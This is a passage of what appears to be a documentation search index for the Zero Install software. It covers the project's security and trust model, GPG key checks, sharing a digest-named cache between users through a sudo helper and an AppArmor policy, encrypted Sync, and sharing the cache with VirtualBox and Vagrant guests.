Zero Install currently warns users if they run software signed with an unknown GPG key (we maintain a default database of known keys, but we do not have the resources to verify the owners of the keys). Note that even if a key is in the known keys database, users must still agree to trust that key. Again, organisations may wish to keep their own white-list of allowed keys. The first option can be made even harder if the developer has a second (non-networked) machine with the GPG key, although not all developers will have a spare machine for this purpose. Conclusions We have discussed the need for security and the differences between traditional software installation systems and Zero Install. While installing software with traditional systems can cause arbitrary changes to your system, Zero Install does not run any of the downloaded code during installation; it merely unpacks files to a new directory. Securing the installation process is not the whole story; software should also be executed in a restricted environment. Several other projects are developing suitable sandboxes. Even without such extra programs, the default security mechanisms built in to Linux provide improvements over traditional installation. Whether we have strong sandboxing or not, it is important to know where software has come from and to only accept digitally signed software. Zero Install maintains a list of trusted keys, and aids the user's decision of whether to trust a key using its database of known keys. The default database provides only low security; organisations may wish to provide their own database and perform real verification checks on authors. Organisations may also wish to prevent users from installing unapproved software at all. An attacker wishing to install malicious software must either trick users into trusting them, or steal a trusted developer's GPG key. This is considerably more secure than most other distribution systems, many of which contain no security at all.","title":"Security"},{"location":"details/security/#overview","text":"No-one has the time to verify every line of code in every program they use. Yet, we need to use these programs to process our data, and we must guard against the possibility that the code we use is malicious. We need methods to help ensure that we don't allow malicious code to run, to limit the damage it can do if we do run it, and to discover and recover from compromises when they do happen. Some key points about Zero Install's security model: If one user downloads a malicious program, other users aren't affected In traditional systems, installing a program also puts files into shared directories like /usr/bin and /usr/lib under short names. So if one user installs the Gimp from http://evil.com then it might save the executable as /usr/bin/gimp . Another user might run this, thinking it was from http://gimp.org . In a Zero Install system, users specify the full URI of the program they want to run, and the system only shares the copy if they really are the same. The short-cuts (e.g., that \"Run gimp\" means \"Run http://gimp.org/gimp\" ) are per-user, but the programs themselves are shared. Installation does not execute any downloaded code Most installation systems run code in the downloaded package as part of the installation process. Typically, these scripts are run as root and can do anything they like to the machine. Zero Install merely fetches files into the cache during installation; nothing downloaded is executed and files from different packages cannot conflict (because they each go in their own directory). Digital signatures are always checked before software is run To protect against the possibility of attackers breaking into a web-server and replacing the real software with modified versions, or redirecting network traffic to the real web-server to their own, Zero Install only runs code that is signed by a GPG key you trust to provide software from that web-site. By default, it will automatically approve keys known to the key information server; this can be disabled from the preferences dialog. Security when running programs is your problem Zero Install goes to great lengths to get software on to your machine without letting it do anything dangerous, but what happens next is up to you. On a normal Linux system this still brings some benefits (e.g. users can share programs without also sharing viruses), but the real advantages come when you combine this with some sandboxing technology to restrict what programs can do when running.","title":"Overview"},{"location":"details/security/#demo","text":"For a demonstration of using sandboxing with Zero Install, see ebox .","title":"Demo!"},{"location":"details/security/#authorisation-vs-privileges","text":"It's also important to separate out two aspects of installation that are easily confused: who is authorised to install software and what privileges the software is given by the act of installing it. Here, \"apt-get\" is used as a short-hard for \"a typical traditional Linux package manager\": Privileges granted Only root can install things Anyone can install things Full access Default apt-get apt-get with modified rules No access Zero Install with restrictions Default Zero Install A typical package manager only allows root (or an administrator) to install software by default, and grants that software full access to the machine, including access to all user accounts. You can change the rules to allow others to install software (e.g. using PolicyKit or sudoers, you might allow anyone to upgrade a package), but the software still gets complete access to the machine. Zero Install allows anyone to install software by default, but gives the software no access to the machine (since it doesn't run any of its code at install time). You could configure Zero Install so that only root can install software, but the software would still get no ability to do anything at install time. The reason we allow anyone to install software by default is the principle of Do Not Prohibit What You Cannot Prevent [citation needed]. On Linux, unprivileged users can install software even without Zero Install, so trying to stop them makes life harder for legitimate users but doesn't improve security.","title":"Authorisation vs Privileges"},{"location":"details/security/#security-and-usability","text":"Some people think of security and usability as a trade-off, with systems being either easy to use, or secure, but not both. But in fact, security is a necessary part of usability. Some examples: I used to program on a system which had no memory protection, allowing any process to overwrite any other process's memory. Linux prevents programs from doing this. This makes my life as a programmer easier, not harder, because when a program crashes I know that the problem is in that program and not in some other one. Sometimes, I forget where I saved a file. But, I never need to search /usr in case I accidentally saved my letter there; it can't be there, because my word processor doesn't have permission to save there. Windows users (so I hear) often find their computers are infected with spyware and adware, which slows them down, causes crashes, and redirects them to undesirable web sites. Such a system has poor usability. An artist may find a useful image processing filter on the web. If all this filter can do is read an input image and output a modified one then the artist is more likely to try it (and produce better work). If image filters can seriously damage the system then the artist may have to pass it over; the risk from a malicious filter is too great. Few programs are as easy to run in a restricted environment as the image filter example above; an accounting package needs access to my accounts, for example. Still, with good security we can evaluate lots of possible programs and then only weigh up the risk for the one we choose. Without good security we must evaluate fewer programs, and we are at risk from each one we try. Good security is therefore vital to a usable system. A usable system must be understandable and predictable; on a system where any action can have any consequence this is not possible. Consider traditional software installation on Linux or Windows. You download some package and execute a script inside it. Imagine that I give you a package in your favourite format (setup.exe, .deb, .rpm, source tarball, etc) and ask you to install it. Assume that your system is functioning correctly; what will happen as a result of installing this program? Will a new item appear on your Start menu (or equivalent)? Will some other program on your computer stop working as a result of a installing this one? Will a new service be added to your boot sequence? Will your browser's saved passwords be posted to an IRC server and your hard disk reformatted? The answer, for all the formats listed above, is \"I don't know\". With Zero Install, none of these things can happen without some extra action on your part. Now, Zero Install is not a complete solution to these problems. In particular, it does not stop programs from doing any of these things when run . That problem is for some other project to solve (and there are plenty of people working on this; see Plash or SysTrace for example). But Zero Install already brings benefits without the use of these programs (the effects above which require root access will be blocked), and it is clearly a necessary base on which such technologies can be built. Being able to run software in a sandbox is of limited benefit if it requires full root access to install it first!","title":"Security and Usability"},{"location":"details/security/#zero-installs-trust-model","text":"Sandboxing is used to restrict what code can do. Linux and similar systems come with a simple sandboxing system based on users. The system has a number of users, and each user can run whatever software they please. Ideally, it is not possible for malicious code executed by one user to damage the system or threaten the security of any other user. However, the code can do anything that the user running it is permitted to do (such as delete that user's files, or log the user's keystrokes and send them to another computer). A second approach is to ensure that only software written by trusted individuals is run. This presents two problems: how do we come to trust someone to provide reliable software, and how do we know that a particular program really came from them? The basis of Zero Install's model is the standard multi-user model used by Linux. The principle is that the system's responsibility is to protect users from each other, and to protect the system from the users. If one user (or a program they run) can delete another user's files without permission, then that is a problem with the system's security. However, the system is not responsible for protecting users from themselves; it is up to users to take appropriate measures to prevent the programs they run from damaging their own files, for example. Of course, the system may itself have bugs. Ideally, the system should be upgraded when a problem is found (e.g. in the Linux kernel). However, if users are using sandboxing to protect themselves from the programs they run then this may provide an added layer of protection to the system, assuming the users themselves are not malicious. Users can protect themselves by using additional sandboxes within their own sandboxed user account. A good example of this is User-Mode-Linux , which runs a new Linux system within a single user account of a main Linux system. The user can use the sub-Linux's security features to restrict what applications can do inside it, while the whole sub-Linux system is restricted to the user's permissions within the main Linux system. More light-weight sandboxes include running JavaScript in a web browser, or running Java applications with Java's sandboxing turned on. However, good per-user sandboxing is still more of a long-term goal for Linux than a practical solution for many programs at the moment (but see Plash for a good example of where things are heading). Also, some programs really do need full access to the user's files. For example, a file manager needs to be able to delete the user's files, and an email client needs to be able to read the user's emails and send new ones, so making sure that software is not malicious in the first place is very important. When deciding whether to trust a particular programmer, the user will have to consult external sources. Distributions typically fill this role (recommending certain programs only), and friends, magazines, etc, can provide this information too. A trusted programmer is identified by their GPG key's fingerprint. When the user runs a program, Zero Install downloads the feed and checks that it is signed by someone the user trusts. If not, the user is asked to confirm that they trust the holder of the key to provide software to them: Once trusted, Zero Install will accept any feed from the same domain signed by that key. Zero Install updates feeds at the request of the user (clicking the 'Refresh' button), or automatically (monthly, by default) if the user sets their freshness policy to request this. If a program is not used, Zero Install does not check for updates to it. Zero Install does not accept incoming network connections, so even if a malicious key is trusted, the owner must still get the user to download a feed they control.","title":"Zero Install's trust model"},{"location":"details/security/#possible-attacks","text":"To run malicious software on a user's machine, an attacker could: Publish the software on their own web-page, and convince users to run it, or Cause their software to be run when the user tries to run some other program. Guarding against the first requires educating users not to run untrusted software (this applies whether using Zero Install or not), sandboxing any software that is run if possible, and advising users that the software is unknown and/or known to be malicious. Organisations may wish to keep their own internal database of programs approved for use within the organisation, and to prevent users from installing programs not on this list. To perform the second attack, the attacker needs to replace a trusted feed file on a server with a compromised version. However, the new file must be signed, and the secret signing key should not be on the server. Therefore, the attacker has two options: Break into the developer's private machine, get their private GPG key, install a keystroke logger, and get the GPG pass-phrase. Then break into the web server and install a compromised signed feed. Break into the webserver and install a feed signed with their own key (a new key with a new fingerprint, but claiming to belong to the original author), and trick users into accepting it. The second option is probably easiest. Zero Install currently warns users if they run software signed with an unknown GPG key (we maintain a default database of known keys, but we do not have the resources to verify the owners of the keys). Note that even if a key is in the known keys database, users must still agree to trust that key. Again, organisations may wish to keep their own white-list of allowed keys. The first option can be made even harder if the developer has a second (non-networked) machine with the GPG key, although not all developers will have a spare machine for this purpose.","title":"Possible attacks"},{"location":"details/security/#conclusions","text":"We have discussed the need for security and the differences between traditional software installation systems and Zero Install. While installing software with traditional systems can cause arbitrary changes to your system, Zero Install does not run any of the downloaded code during installation; it merely unpacks files to a new directory. Securing the installation process is not the whole story; software should also be executed in a restricted environment. Several other projects are developing suitable sandboxes. Even without such extra programs, the default security mechanisms built in to Linux provide improvements over traditional installation. Whether we have strong sandboxing or not, it is important to know where software has come from and to only accept digitally signed software. Zero Install maintains a list of trusted keys, and aids the user's decision of whether to trust a key using its database of known keys. The default database provides only low security; organisations may wish to provide their own database and perform real verification checks on authors. Organisations may also wish to prevent users from installing unapproved software at all. An attacker wishing to install malicious software must either trick users into trusting them, or steal a trusted developer's GPG key. This is considerably more secure than most other distribution systems, many of which contain no security at all.","title":"Conclusions"},{"location":"details/servers/","text":"Zero Install downloads files from several different places. First, it downloads from the author's web-site a list of versions of the application that are available and what other libraries the application requires. Zero Install then downloads information about those libraries too, from their web-sites. These lists are signed by the developer who published them. When you use software from a developer for the first time, Zero Install asks you to confirm that you trust this person's signature. It asks your Key information server for extra information to help you decide. Finally, it chooses an appropriate set of versions and downloads those packages. The Mirror server is used as a backup if the project servers don't respond or return an error.","title":"Servers"},{"location":"details/sharing/","text":"On systems with multiple users, it would be very inefficient if each user had to download their own copy of each program. Most packaging systems require users to have root access in order to share software (either the root password, or admin access through sudo). However, this is a security risk. Zero Install allows software to be shared automatically and safely between mutually-untrusting users. Note: this page is about sharing between users on a single computer. If you want to do peer-to-peer sharing on a LAN, see 0share . If you want to share between virtual machines running on a single host, see virtual machines . How it works Setting up sharing Linux AppArmor policy Windows Technical details Questions How it works A digest is a short value calculated from a (usually much bigger) file. There are various different algorithms that can be used. For example, this command calculates the SHA1 digest of the ls binary: $ sha1sum /bin/ls 90b703d3d29ef20f3ef711eb38625d618c70c4f6 /bin/ls A cryptographic digest (like SHA1) is one where it is believed to be infeasibly difficult to create a different program with the same digest. So, if someone gives you a binary with digest above, you can be sure that it's identical to the version of ls that I'm using. Cryptographic digests are the basis of secure sharing in Zero Install. Here's we'll see an example of how two users (Alice and Bob) can share the ROX-Filer program, even if they don't trust each other. First, Alice runs ROX-Filer: Alice visits rox.sourceforge.net and downloads the small ROX-Filer.xml feed file. She decides to run ROX-Filer version 2.5 from this file. The Zero Install software gets the digest for this version ( sha1=d22a35871bad157e32aa169e3f4feaa8d902fdf2 ) from the file. It also downloads the package and unpacks it. The software passes the unpacked archive to the privileged helper, which checks the digest and copies the directory to /var/cache/0install.net/implementations/sha1=d22a35871bad157e32aa169e3f4feaa8d902fdf2 on Linux or C:\\ProgramData\\0install.net\\implementations\\sha1=d22a35871bad157e32aa169e3f4feaa8d902fdf2 on Windows (see File locations ). ROX-Filer runs. Later, Bob decides to run it too. The system doesn't need to download a second copy: Bob visits rox.sourceforge.net and downloads the small ROX-Filer.xml feed file. He decides to run ROX-Filer version 2.5 from this file. The Zero Install software gets the digest for this version ( sha1=d22a35871bad157e32aa169e3f4feaa8d902fdf2 ) from the file. Zero Install sees that the directory /var/cache/0install.net/implementations/sha1=d22a35871bad157e32aa169e3f4feaa8d902fdf2 (or C:\\ProgramData\\0install.net\\... ) already exists, so it doesn't download the software again. ROX-Filer runs. But what if we have a malicious user, Charlie? A new machine arrives, and Charlie decides to install a malicious version of ROX-Filer before anyone else installs a good copy: Charlie visits rox.sourceforge.net and downloads the small ROX-Filer.xml feed file. He decides to use ROX-Filer version 2.5 from this file. The Zero Install software gets the digest for this version ( sha1=d22a35871bad157e32aa169e3f4feaa8d902fdf2 ) from the file. It also downloads the package and unpacks it. Charlie modifies the download to do something nasty (or, the download has been tampered with, or Charlie's account has been infected with a virus which modifies it, etc). If Charlie tries to install the result to /var/cache/0install.net/implementations/sha1=d22a35871bad157e32aa169e3f4feaa8d902fdf2 , the privileged helper rejects it, because the digest of the directory's contents no longer matches that name. Charlie is forced to install his malicious version as /var/cache/0install.net/implementations/sha1=3ab21d8f410e3a5a863d3a32a152edb31ba42f75 instead. When Alice runs ROX-Filer as before, the software sees that /var/cache/0install.net/implementations/sha1=d22a35871bad157e32aa169e3f4feaa8d902fdf2 doesn't exist and downloads a genuine copy as before. When Bob runs ROX-Filer, he will use Alice's version. You might be worried that Charlie was able to put malicious code in the shared cache. However, it doesn't matter because other users won't try to run it, since it doesn't have the name they're looking for. Of course, it might not even be malicious: a program that deletes files is malicious if it's called cat , but not if it's called rm . As long as users don't go around running random binaries they find in the cache, they're OK. Setting up sharing Linux These instructions require Zero Install version 0.30 or later. The actual code for doing sharing this way is currently experimental and not enabled by default. This section shows how the system administrator (someone with root access) can enable it. It is probably best not to do this in security critical environments yet as we're still working on tightening the security. Feedback welcome. This diagram shows the four processes involved in adding a new package to the system cache. If you have a different environment, you can use a different 'helper' script to integrate it with Zero Install. Install 0install version 0.30 or later. Create a new system user called 'zeroinst' (the Ubuntu package will have done this for you automatically). # useradd -d /var/cache/0install.net --system zeroinst Create the shared directory, owned by this new user (also done automatically by the Ubuntu package): # mkdir -p /var/cache/0install.net/implementations # chown zeroinst /var/cache/0install.net/implementations Create /usr/local/bin/0store-secure-add-helper with: #!/bin/sh exec sudo -S -u zeroinst /usr/bin/0store-secure-add \"$@\" < /dev/null Note: the path will be /usr/ local /bin/0store-secure-add if you installed from source Make your new script readable and executable by everyone: # chmod a+rx /usr/local/bin/0store-secure-add-helper Use visudo to add these lines to /etc/sudoers : Defaults>zeroinst env_reset,always_set_home ALL ALL=(zeroinst) NOPASSWD: /usr/bin/0store-secure-add Note: the NOPASSWD line MUST go at the end of the file, otherwise it is likely to be overridden by later entries. Again, use /usr/local/bin if you installed from source. When launch wants to install a package, it will invoke 0store-secure-add-helper . This script uses sudo to run 0store-secure-add as the zeroinst user, with a clean environment. No password is required for this. AppArmor policy The following AppArmor policy can be used to confine the 0store-secure-add process somewhat. However, the process does need read access everywhere (since it could be copying from anywhere) and write access to the entire cache directory, so this doesn't restrict it much more than it already is due to running as a separate user. #include <tunables/global> /usr/bin/0store-secure-add { #include <abstractions/base> #include <abstractions/python> /** r, /usr/bin/0store-secure-add mr, /usr/bin/python* ixr, /var/cache/0install.net/implementations/** rw, } Windows On Windows the shared cache is managed by the Zero Install Store Service . It serves roughly the same role as 0store-secure-add on Linux. This service ensures that no user can, intentionally or unintentionally, manipulate the contents of the shared cache. Every user can ask the service to add implementations to the shared cache on their behalf after validating the hash. This way other users only get cached implementations if they request the exact same version with the same hash. The Zero Install Store Service is installed automatically when Zero Install is deployed for all users (machine-wide). Zero Install automatically uses the service when it is available (unless in portable mode ) and falls back to the user cache if the service is unavailable. The service uses C:\\ProgramData\\0install.net\\implementations (see File locations ) for storing implementations by default. A custom location can be specified in the file C:\\ProgramData\\0install.net\\injector\\implementation-dirs . When using a custom location make sure it is only writeable by SYSTEM and Administrators and readable by Everyone . Technical details Zero Install communicates with the service using named pipes . The user process downloads an archive to a temporary directory and then passes its file path to the service with a request for extraction. The service extracts the archive, verifies the manifest digest and adds the implementation to the cache. During the entire process the service reports the progress back to the user process. Named pipes allow the service to impersonate the calling user. The archive is read and extracted using the privileges of the calling user but verified and added to the cache using the privileges of the service. The service records write access to the cache as well as any potential problems in the Windows Event Log . Questions How do users uninstall? Currently, they can't. You (the admin) can delete directories from /var/cache/0install.net/implementations to save space (preferably not while they're being used ;-). Ideally, we should track which users have requested which programs and remove them automatically when no-one wants them anymore. What kind of things need 'tightening'? Several things spring to mind: What happens if the user changes the directory whilst it's being added? We need to audit 0store-secure-add . Denial of service attacks, if one user stores lots of stuff (need quotas). Why do things still get stored in ~/.cache after setting this up? Things you've already installed will remain there. Only new software is added in the system cache. Also, the old sha1 algorithm isn't accepted by the helper, so software using that can't go in the shared cache. If you still have problems, try running 0launch -vvc URI (to see debug output). Finally, make sure your script is executable!","title":"Sharing downloads between users"},{"location":"details/sharing/#how-it-works","text":"A digest is a short value calculated from a (usually much bigger) file. There are various different algorithms that can be used. For example, this command calculates the SHA1 digest of the ls binary: $ sha1sum /bin/ls 90b703d3d29ef20f3ef711eb38625d618c70c4f6 /bin/ls A cryptographic digest (like SHA1) is one where it is believed to be infeasibly difficult to create a different program with the same digest. So, if someone gives you a binary with digest above, you can be sure that it's identical to the version of ls that I'm using. Cryptographic digests are the basis of secure sharing in Zero Install. Here's we'll see an example of how two users (Alice and Bob) can share the ROX-Filer program, even if they don't trust each other. First, Alice runs ROX-Filer: Alice visits rox.sourceforge.net and downloads the small ROX-Filer.xml feed file. She decides to run ROX-Filer version 2.5 from this file. The Zero Install software gets the digest for this version ( sha1=d22a35871bad157e32aa169e3f4feaa8d902fdf2 ) from the file. It also downloads the package and unpacks it. The software passes the unpacked archive to the privileged helper, which checks the digest and copies the directory to /var/cache/0install.net/implementations/sha1=d22a35871bad157e32aa169e3f4feaa8d902fdf2 on Linux or C:\\ProgramData\\0install.net\\implementations\\sha1=d22a35871bad157e32aa169e3f4feaa8d902fdf2 on Windows (see File locations ). ROX-Filer runs. Later, Bob decides to run it too. The system doesn't need to download a second copy: Bob visits rox.sourceforge.net and downloads the small ROX-Filer.xml feed file. He decides to run ROX-Filer version 2.5 from this file. The Zero Install software gets the digest for this version ( sha1=d22a35871bad157e32aa169e3f4feaa8d902fdf2 ) from the file. Zero Install sees that the directory /var/cache/0install.net/implementations/sha1=d22a35871bad157e32aa169e3f4feaa8d902fdf2 (or C:\\ProgramData\\0install.net\\... ) already exists, so it doesn't download the software again. ROX-Filer runs. But what if we have a malicious user, Charlie? A new machine arrives, and Charlie decides to install a malicious version of ROX-Filer before anyone else installs a good copy: Charlie visits rox.sourceforge.net and downloads the small ROX-Filer.xml feed file. He decides to use ROX-Filer version 2.5 from this file. The Zero Install software gets the digest for this version ( sha1=d22a35871bad157e32aa169e3f4feaa8d902fdf2 ) from the file. It also downloads the package and unpacks it. Charlie modifies the download to do something nasty (or, the download has been tampered with, or Charlie's account has been infected with a virus which modifies it, etc). If Charlie tries to install the result to /var/cache/0install.net/implementations/sha1=d22a35871bad157e32aa169e3f4feaa8d902fdf2 , the privileged helper rejects it, because the digest of the directory's contents no longer matches that name. Charlie is forced to install his malicious version as /var/cache/0install.net/implementations/sha1=3ab21d8f410e3a5a863d3a32a152edb31ba42f75 instead. When Alice runs ROX-Filer as before, the software sees that /var/cache/0install.net/implementations/sha1=d22a35871bad157e32aa169e3f4feaa8d902fdf2 doesn't exist and downloads a genuine copy as before. When Bob runs ROX-Filer, he will use Alice's version. You might be worried that Charlie was able to put malicious code in the shared cache. However, it doesn't matter because other users won't try to run it, since it doesn't have the name they're looking for. Of course, it might not even be malicious: a program that deletes files is malicious if it's called cat , but not if it's called rm . As long as users don't go around running random binaries they find in the cache, they're OK.","title":"How it works"},{"location":"details/sharing/#setting-up-sharing","text":"","title":"Setting up sharing"},{"location":"details/sharing/#linux","text":"These instructions require Zero Install version 0.30 or later. The actual code for doing sharing this way is currently experimental and not enabled by default. This section shows how the system administrator (someone with root access) can enable it. It is probably best not to do this in security critical environments yet as we're still working on tightening the security. Feedback welcome. This diagram shows the four processes involved in adding a new package to the system cache. If you have a different environment, you can use a different 'helper' script to integrate it with Zero Install. Install 0install version 0.30 or later. Create a new system user called 'zeroinst' (the Ubuntu package will have done this for you automatically). # useradd -d /var/cache/0install.net --system zeroinst Create the shared directory, owned by this new user (also done automatically by the Ubuntu package): # mkdir -p /var/cache/0install.net/implementations # chown zeroinst /var/cache/0install.net/implementations Create /usr/local/bin/0store-secure-add-helper with: #!/bin/sh exec sudo -S -u zeroinst /usr/bin/0store-secure-add \"$@\" < /dev/null Note: the path will be /usr/ local /bin/0store-secure-add if you installed from source Make your new script readable and executable by everyone: # chmod a+rx /usr/local/bin/0store-secure-add-helper Use visudo to add these lines to /etc/sudoers : Defaults>zeroinst env_reset,always_set_home ALL ALL=(zeroinst) NOPASSWD: /usr/bin/0store-secure-add Note: the NOPASSWD line MUST go at the end of the file, otherwise it is likely to be overridden by later entries. Again, use /usr/local/bin if you installed from source. When launch wants to install a package, it will invoke 0store-secure-add-helper . This script uses sudo to run 0store-secure-add as the zeroinst user, with a clean environment. No password is required for this.","title":"Linux"},{"location":"details/sharing/#apparmor-policy","text":"The following AppArmor policy can be used to confine the 0store-secure-add process somewhat. However, the process does need read access everywhere (since it could be copying from anywhere) and write access to the entire cache directory, so this doesn't restrict it much more than it already is due to running as a separate user. #include <tunables/global> /usr/bin/0store-secure-add { #include <abstractions/base> #include <abstractions/python> /** r, /usr/bin/0store-secure-add mr, /usr/bin/python* ixr, /var/cache/0install.net/implementations/** rw, }","title":"AppArmor policy"},{"location":"details/sharing/#windows","text":"On Windows the shared cache is managed by the Zero Install Store Service . It serves roughly the same role as 0store-secure-add on Linux. This service ensures that no user can, intentionally or unintentionally, manipulate the contents of the shared cache. Every user can ask the service to add implementations to the shared cache on their behalf after validating the hash. This way other users only get cached implementations if they request the exact same version with the same hash. The Zero Install Store Service is installed automatically when Zero Install is deployed for all users (machine-wide). Zero Install automatically uses the service when it is available (unless in portable mode ) and falls back to the user cache if the service is unavailable. The service uses C:\\ProgramData\\0install.net\\implementations (see File locations ) for storing implementations by default. A custom location can be specified in the file C:\\ProgramData\\0install.net\\injector\\implementation-dirs . When using a custom location make sure it is only writeable by SYSTEM and Administrators and readable by Everyone .","title":"Windows"},{"location":"details/sharing/#technical-details","text":"Zero Install communicates with the service using named pipes . The user process downloads an archive to a temporary directory and then passes its file path to the service with a request for extraction. The service extracts the archive, verifies the manifest digest and adds the implementation to the cache. During the entire process the service reports the progress back to the user process. Named pipes allow the service to impersonate the calling user. The archive is read and extracted using the privileges of the calling user but verified and added to the cache using the privileges of the service. The service records write access to the cache as well as any potential problems in the Windows Event Log .","title":"Technical details"},{"location":"details/sharing/#questions","text":"How do users uninstall? Currently, they can't. You (the admin) can delete directories from /var/cache/0install.net/implementations to save space (preferably not while they're being used ;-). Ideally, we should track which users have requested which programs and remove them automatically when no-one wants them anymore. What kind of things need 'tightening'? Several things spring to mind: What happens if the user changes the directory whilst it's being added? We need to audit 0store-secure-add . Denial of service attacks, if one user stores lots of stuff (need quotas). Why do things still get stored in ~/.cache after setting this up? Things you've already installed will remain there. Only new software is added in the system cache. Also, the old sha1 algorithm isn't accepted by the helper, so software using that can't go in the shared cache. If you still have problems, try running 0launch -vvc URI (to see debug output). Finally, make sure your script is executable!","title":"Questions"},{"location":"details/sync/","text":"Zero Install Sync allows you to synchronize your list of applications, desktop integrations and command-line aliases between multiple machines. You either need a free 0install.de user account or you can use your own server. Example You download LibreOffice and KeePass on your first PC using Zero Install. Zero Install Sync tells your second computer which applications you installed. Your second computer downloads the same applications automatically. Technical details The synchronization algorithm works as follows: Download existing application list from the server if present and decrypt it. Merge the data from the server into the local application list using a three-way merge. Apply any changes made to the application list to the desktop environment. Encrypt and upload the new application list. Store a copy of the application list locally for use as a baseline for the next merge. All data is encrypted locally before transmission using AES-128. Therefore the server remains unaware of the actual data being synchronized. The communication with the server is handled via a simple REST interface which is documented at https://0install.de/sync/ . If you want to run your own Sync server you have the following options: Use our PHP script on your web server. Use an empty directory on a WebDAV server. Use a Windows file share.","title":"Sync"},{"location":"details/sync/#technical-details","text":"The synchronization algorithm works as follows: Download existing application list from the server if present and decrypt it. Merge the data from the server into the local application list using a three-way merge. Apply any changes made to the application list to the desktop environment. Encrypt and upload the new application list. Store a copy of the application list locally for use as a baseline for the next merge. All data is encrypted locally before transmission using AES-128. Therefore the server remains unaware of the actual data being synchronized. The communication with the server is handled via a simple REST interface which is documented at https://0install.de/sync/ . If you want to run your own Sync server you have the following options: Use our PHP script on your web server. Use an empty directory on a WebDAV server. Use a Windows file share.","title":"Technical details"},{"location":"details/virtual-machines/","text":"As well as allowing sharing between users, you can also use Zero Install to share packages between virtual machines. That is, the package is downloaded and stored once, but all virtual machines can run it. VirtualBox Vagrant VirtualBox VirtualBox is a popular free (GPL) virtualisation system. To share your host's cache with a guest: Create a new guest and install an operating system as usual. The guest OS does not need to be the same as the host OS. Install the guest tools (choose Install Guest Additions... from the Devices menu). Add a shared folder. Folder Path is your implementation cache on the host. This will be /var/cache/0install.net/implementations if you have sharing enabled, or ~/.cache/0install.net/implementations if not. Folder Name can be anything, e.g. ZeroInstall . In the guest, mount the new file-system under /var/cache/0install.net/implementations (regardless of where it is on the host): $ sudo mount -t vboxsf ZeroInstall /var/cache/0install.net/implementations Notes: If you used the host's /var/cache directory then the guest won't be able to write to the host's cache, which is good for security. Anything installed by the guest will be available only on that guest. If you want to configure sharing between guest users, however, you'll need to configure a second shared directory, one for guest-wide packages and one for host packages ( man 0store for details). If you shared the ~/.cache directory, then root in the guest will be able to write to the host cache, which is good for sharing but not so good for security. If you also configure sharing in the guest, then guest users can install to the host's cache. Here, you are trusting the guest OS to check the digests correctly. It is also possible (though more difficult) to set things up so that an untrusted guest OS can put things in the host's cache (verified by the host). For this, you will need to make your own version of the 0store-secure-add-helper script that passes the directory to the host for verification. Because Zero Install packages are named by their digest, there are no problems with sharing a single cache between different architectures (whether virtual machines or physical machines with a network file-system). Packages that can be shared will be shared automatically, packages that can't will co-exist peacefully. Warning: Older versions of the VirtualBox guest additions have problems with symlinks in shared folders. If you allow guests to write to a shared cache on the host, you may get the error Incorrect manifest -- archive is corrupted , even though the archive is actually OK. Guest additions 4.0.4 is known to not work. Version 4.2.0 seems fine. Vagrant Vagrant is a tool for managing virtual development environments using VirtualBox. In your Vagrantfile, use something like this: Vagrant::Config.run do |config| [...] config.vm.share_folder \"host-cache\", \"/var/cache/0install.net/implementations\", \"/var/cache/0install.net/implementations\" # This next bit is convenient but less secure... config.vm.customize [\"setextradata\", :id, \"VBoxInternal2/SharedFoldersEnableSymlinksCreate/shared-guest-cache\", \"1\"] config.vm.share_folder \"shared-guest-cache\", \"/home/vagrant/.cache/0install.net/implementations\", \"/home/me/.cache/shared-vagrant-guest-cache\" end or, for later versions: Vagrant.configure(VAGRANTFILE_API_VERSION) do |config| [...] config.vm.synced_folder \"/var/cache/0install.net/implementations\", \"/var/cache/0install.net/implementations\" # This next bit is convenient but less secure... config.vm.provider :virtualbox do |vb| vb.customize [\"setextradata\", :id, \"VBoxInternal2/SharedFoldersEnableSymlinksCreate/shared-guest-cache\", \"1\"] end config.vm.synced_folder \"/home/me/.cache/shared-vagrant-guest-cache\", \"/home/vagrant/.cache/0install.net/implementations\" end Change the /home/me/.cache/shared-vagrant-guest-cache line to the path where you want to store the shared cache on the host. Ensure you have version 4.2.0 or later of the guest additions installed, or symlinks might not work. Here, the VMs will have read-only access to the host's cache (assuming you've set up sharing on the host), plus read-write access to a cache shared between the guests. Note that a malicious guest can corrupt this cache, and thus affect other VMs using it. However, assuming non-malicious guests, there is no problem sharing the cache between different VM types (e.g. Debian, Fedora, 32-bit, 64-bit, etc).","title":"Virtual machines"},{"location":"details/virtual-machines/#virtualbox","text":"VirtualBox is a popular free (GPL) virtualisation system. To share your host's cache with a guest: Create a new guest and install an operating system as usual. The guest OS does not need to be the same as the host OS. Install the guest tools (choose Install Guest Additions... from the Devices menu). Add a shared folder. Folder Path is your implementation cache on the host. This will be /var/cache/0install.net/implementations if you have sharing enabled, or ~/.cache/0install.net/implementations if not. Folder Name can be anything, e.g. ZeroInstall . In the guest, mount the new file-system under /var/cache/0install.net/implementations (regardless of where it is on the host): $ sudo mount -t vboxsf ZeroInstall /var/cache/0install.net/implementations Notes: If you used the host's /var/cache directory then the guest won't be able to write to the host's cache, which is good for security. Anything installed by the guest will be available only on that guest. If you want to configure sharing between guest users, however, you'll need to configure a second shared directory, one for guest-wide packages and one for host packages ( man 0store for details). If you shared the ~/.cache directory, then root in the guest will be able to write to the host cache, which is good for sharing but not so good for security. If you also configure sharing in the guest, then guest users can install to the host's cache. Here, you are trusting the guest OS to check the digests correctly. It is also possible (though more difficult) to set things up so that an untrusted guest OS can put things in the host's cache (verified by the host). For this, you will need to make your own version of the 0store-secure-add-helper script that passes the directory to the host for verification. Because Zero Install packages are named by their digest, there are no problems with sharing a single cache between different architectures (whether virtual machines or physical machines with a network file-system). Packages that can be shared will be shared automatically, packages that can't will co-exist peacefully. Warning: Older versions of the VirtualBox guest additions have problems with symlinks in shared folders. If you allow guests to write to a shared cache on the host, you may get the error Incorrect manifest -- archive is corrupted , even though the archive is actually OK. Guest additions 4.0.4 is known to not work. Version 4.2.0 seems fine.","title":"VirtualBox"},{"location":"details/virtual-machines/#vagrant","text":"Vagrant is a tool for managing virtual development environments using VirtualBox. In your Vagrantfile, use something like this: Vagrant::Config.run do |config| [...] config.vm.share_folder \"host-cache\", \"/var/cache/0install.net/implementations\", \"/var/cache/0install.net/implementations\" # This next bit is convenient but less secure... config.vm.customize [\"setextradata\", :id, \"VBoxInternal2/SharedFoldersEnableSymlinksCreate/shared-guest-cache\", \"1\"] config.vm.share_folder \"shared-guest-cache\", \"/home/vagrant/.cache/0install.net/implementations\", \"/home/me/.cache/shared-vagrant-guest-cache\" end or, for later versions: Vagrant.configure(VAGRANTFILE_API_VERSION) do |config| [...] config.vm.synced_folder \"/var/cache/0install.net/implementations\", \"/var/cache/0install.net/implementations\" # This next bit is 